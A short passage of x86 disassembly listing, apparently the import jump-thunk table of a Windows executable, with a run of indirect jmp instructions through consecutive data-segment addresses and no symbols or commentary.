  41cfba:	jmp    DWORD PTR ds:0x41f6d8
  41cfc0:	jmp    DWORD PTR ds:0x41f6dc
  41cfc6:	jmp    DWORD PTR ds:0x41f6e0
  41cfcc:	jmp    DWORD PTR ds:0x41f6e4
  41cfd2:	jmp    DWORD PTR ds:0x41f6e8
  41cfd8:	jmp    DWORD PTR ds:0x41f6ec
  41cfde:	jmp    DWORD PTR ds:0x41f6f0
  41cfe4:	jmp    DWORD PTR ds:0x41f6f4
  41cfea:	jmp    DWORD PTR ds:0x41f6f8
  41cff0:	jmp    DWORD PTR ds:0x41f6fc
  41cff6:	jmp    DWORD PTR ds:0x41f700
  41cffc:	jmp    DWORD PTR ds:0x41f704
  41d002:	jmp    DWORD PTR ds:0x41f708
  41d008:	jmp    DWORD PTR ds:0x41f70c
  41d00e:	jmp    DWORD PTR ds:0x41f710
  41d014:	jmp    DWORD PTR ds:0x41f714
  41d01a:	jmp    DWORD PTR ds:0x41f718
  41d020:	jmp    DWORD PTR ds:0x41f71c
  41d026:	jmp    DWORD PTR ds:0x41f720
  41d02c:	jmp    DWORD PTR ds:0x41f724
  41d032:	jmp    DWORD PTR ds:0x41f728
  41d038:	jmp    DWORD PTR ds:0x41f72c
  41d03e:	jmp    DWORD PTR ds:0x41f730
  41d044:	jmp    DWORD PTR ds:0x41f734
  41d04a:	jmp    DWORD PTR ds:0x41f738
  41d050:	jmp    DWORD PTR ds:0x41f73c
  41d056:	jmp    DWORD PTR ds:0x41f740
  41d05c:	jmp    DWORD PTR ds:0x41f744
